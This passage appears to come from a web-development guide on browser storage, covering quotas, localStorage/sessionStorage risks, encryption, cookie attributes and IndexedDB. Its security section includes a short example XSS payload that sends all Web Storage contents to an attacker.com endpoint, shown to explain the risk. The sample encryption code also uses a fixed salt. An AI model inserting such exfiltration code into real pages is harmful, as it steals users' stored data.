  const quotaInMB = (estimate.quota / 1024 / 1024).toFixed(2);
  const percentUsed = ((estimate.usage / estimate.quota) * 100).toFixed(1);

  console.log(`Usage: ${usageInMB}MB / ${quotaInMB}MB (${percentUsed}%)`);

  // Warn if exceeding 80%
  if (estimate.usage / estimate.quota > 0.8) {
    showWarning('Storage usage exceeds 80%. Consider deleting old data.');
  }
}
```

**Response strategies**:
1. **LRU (Least Recently Used) cache**: Save access datetime as metadata and delete older data first
2. **Priority-based deletion**: Delete lower-importance data (cache, temporary files) first
3. **Compression**: Compress JSON data with pako.js or lz-string before saving
4. **Persistence request**: Request protection of important data with `navigator.storage.persist()`
5. **User notification**: Clearly display insufficient capacity in the UI and provide manual deletion options

### Q3: What should I be careful about when storing sensitive data in localStorage/sessionStorage?

Since localStorage and sessionStorage are **stored unencrypted in plain text**, extreme care is needed when storing sensitive data.

**Things that must NEVER be stored**:
- Passwords (even hashed ones should be avoided)
- Credit card information (PCI DSS violation)
- Personally identifiable information (PII): national ID numbers, social security numbers, driver's license numbers
- API secret keys, private tokens

**Things to avoid storing**:
- Authentication tokens (JWT): HttpOnly Cookie should be used
- Session IDs: Cookie (HttpOnly + Secure + SameSite) should be used

**Risk of total data leakage via XSS**:
Since Web Storage is readable from JavaScript, all data is immediately exposed in an XSS attack.
```javascript
// XSS attack example (code injected by attacker)
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({
    localStorage: {...localStorage},
    sessionStorage: {...sessionStorage}
  })
});
```

**Countermeasures if sensitive data must be stored**:

1. **Encrypt with Web Crypto API**:
```javascript
// Generate encryption key (derived from user's passphrase)
async function deriveKey(passphrase) {
  const enc = new TextEncoder();
  const keyMaterial = await crypto.subtle.importKey(
    'raw',
    enc.encode(passphrase),
    'PBKDF2',
    false,
    ['deriveKey']
  );
  return crypto.subtle.deriveKey(
    { name: 'PBKDF2', salt: enc.encode('salt'), iterations: 100000, hash: 'SHA-256' },
    keyMaterial,
    { name: 'AES-GCM', length: 256 },
    false,
    ['encrypt', 'decrypt']
  );
}

// Encrypt and store
async function encryptAndStore(key, data, cryptoKey) {
  const iv = crypto.getRandomValues(new Uint8Array(12));
  const encrypted = await crypto.subtle.encrypt(
    { name: 'AES-GCM', iv },
    cryptoKey,
    new TextEncoder().encode(JSON.stringify(data))
  );
  localStorage.setItem(key, JSON.stringify({
    iv: Array.from(iv),
    data: Array.from(new Uint8Array(encrypted))
  }));
}
```

2. **Set an expiration time**:
```javascript
// Store with timestamp
function setWithExpiry(key, value, ttl) {
  const item = {
    value,
    expiry: Date.now() + ttl
  };
  localStorage.setItem(key, JSON.stringify(item));
}

// Check expiry when retrieving
function getWithExpiry(key) {
  const itemStr = localStorage.getItem(key);
  if (!itemStr) return null;

  const item = JSON.parse(itemStr);
  if (Date.now() > item.expiry) {
    localStorage.removeItem(key);
    return null;
  }
  return item.value;
}
```

3. **Configure Content Security Policy (CSP)**:
Set CSP via HTTP header to prevent XSS attacks.
```
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-rAnD0m'
```

**Recommended alternatives**:
- Auth tokens → HttpOnly Cookie (not accessible from JavaScript)
- Temporary sensitive data → In-memory variable (erased on page reload)
- Persistent sensitive data → Server-side session + session ID (Cookie)

---

## FAQ

### Q1: When does data stored in localStorage get deleted?
localStorage data is deleted when the user explicitly clears browser site data, or when it is automatically evicted (eviction) when the browser's storage is under pressure. Safari's ITP (Intelligent Tracking Prevention) has a restriction where localStorage is cleared if the user doesn't visit the site for 7 days. In private browsing (incognito mode), everything is deleted when the session ends. If persistence is required, it is recommended to call `navigator.storage.persist()` to request storage persistence.

### Q2: When should I choose IndexedDB vs localStorage?
Decide based on the amount and structure of data to store. localStorage is suitable for small amounts (a few KB) of simple key-value data like settings or theme selections. On the other hand, use IndexedDB for structured data that requires searching, binary data (images, files), or data exceeding tens of MB. IndexedDB's asynchronous API does not block the main thread, and also provides fast search via indexes and data integrity guarantees through transactions. IndexedDB is the de facto standard for offline data sync in PWAs.

### Q3: What are the minimum security attributes I should set for Cookies?
For authentication Cookies, at minimum set these 3 attributes: `Secure` (send only over HTTPS), `HttpOnly` (not accessible from JavaScript, XSS protection), and `SameSite=Lax` (CSRF protection for cross-site requests). Additionally, security can be further strengthened by adding `Path=/` (apply to the entire path), an appropriate `Max-Age` or `Expires` (explicit expiration), and the prefix `__Host-` (enforces Secure + path must be / + no domain specification).

---

## Summary

### Key Points for Each Storage

| Storage | Capacity | Main use case | Greatest advantage | Greatest risk |
|---------|----------|--------------|-------------------|---------------|
| Cookie | 4KB | Auth (HttpOnly) | Auto server send | CSRF |
| localStorage | 5-10MB | User settings, theme | Simple, persistent | All data exposed via XSS |
| sessionStorage | 5-10MB | Temporary form save | Auto-cleared when tab closes | All data exposed via XSS |
| IndexedDB | GB-scale | Large data, offline DB | Structured, async, large capacity | API complexity |
| Cache API | GB-scale | HTTP response cache | SW integration, offline support | Cache invalidation design |

### Design Checklist

- [ ] Not storing sensitive data (tokens, passwords) in localStorage/sessionStorage
- [ ] Setting HttpOnly / Secure / SameSite attributes on Cookies
- [ ] QuotaExceededError handling is implemented
- [ ] Verified behavior in private browsing mode
- [ ] Fallback prepared for environments where storage is unavailable
- [ ] IndexedDB version management (migration) is properly designed
- [ ] Data deletion (eviction strategy) for unnecessary data is implemented
- [ ] Cross-tab data consistency has been considered

---

## Next Guides to Read

- [Service Worker and Cache Strategies in Detail](./01-service-worker-cache.md)

---

## References

1. WHATWG. "HTML Living Standard - Web Storage." https://html.spec.whatwg.org/multipage/webstorage.html
2. W3C. "Indexed Database API 3.0." https://www.w3.org/TR/IndexedDB-3/
3. MDN Web Docs. "Web Storage API." Mozilla, 2024. https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API
4. MDN Web Docs. "IndexedDB API." Mozilla, 2024. https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API
5. MDN Web Docs. "Using HTTP cookies." Mozilla, 2024. https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
6. Barker, D. "RFC 6265bis: Cookies: HTTP State Management Mechanism." IETF, 2023. https://httpwg.org/http-extensions/draft-ietf-httpbis-rfc6265bis.html
7. Google Developers. "Storage for the Web." https://web.dev/articles/storage-for-the-web
8. Apple Developer. "Intelligent Tracking Prevention." https://webkit.org/tracking-prevention/
